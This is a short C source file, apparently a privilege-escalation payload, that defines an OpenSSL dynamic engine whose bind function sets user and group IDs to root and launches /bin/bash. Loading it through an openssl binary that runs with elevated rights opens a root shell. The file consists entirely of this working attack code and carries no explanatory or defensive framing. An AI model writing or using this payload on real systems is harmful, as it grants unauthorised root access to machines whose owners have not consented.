#include <openssl/engine.h>
#include <unistd.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0);
  setgid(0);
  system("/bin/bash");
}


IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()